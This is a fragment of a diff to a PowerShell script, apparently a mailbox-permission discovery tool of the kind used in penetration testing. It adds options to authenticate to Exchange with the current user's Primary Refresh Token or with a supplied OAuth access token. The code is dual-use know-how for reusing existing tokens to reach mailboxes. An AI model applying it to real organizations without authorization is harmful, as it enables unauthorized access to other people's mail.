   .PARAMETER Remote
 
   Will prompt for credentials for use with connecting to a remote server such as Office365 or an externally facing Exchange server.
+
+  .PARAMETER UsePrt
+
+  Uses current user's PRT to authenticate.
+
+  .PARAMETER AccessToken
+
+  Use provided oauth access token to authenticate.
 
   .EXAMPLE
 
@@ -2740,7 +3521,15 @@ function Invoke-OpenInboxFinder{
 
     [Parameter(Position = 6, Mandatory = $False)]
     [switch]
-    $Remote 
+    $Remote,
+     
+    [Parameter(Position = 7, Mandatory = $False)]
+    [switch]
+    $UsePrt,
+
+    [Parameter(Position = 8, Mandatory = $False)]
+    [string]
+    $AccessToken
 
   )
   
@@ -2770,6 +3559,17 @@ function Invoke-OpenInboxFinder{
     $remotecred = Get-Credential
     $service.UseDefaultCredentials = $false
     $service.Credentials = $remotecred.GetNetworkCredential()
+  }
+  elseif ($UsePrt) 
+  {
+
+    # use the access token as credential
+    $token = $(Get-ExchangeAccessToken -AccountName $Mailbox).access_token
+    $service.Credentials = [Microsoft.Exchange.WebServices.Data.OAuthCredentials]$token
+  }
+  elseif ($AccessToken) 
+  {
+    $service.Credentials = [Microsoft.Exchange.WebServices.Data.OAuthCredentials]$AccessToken
   }
   else
   {
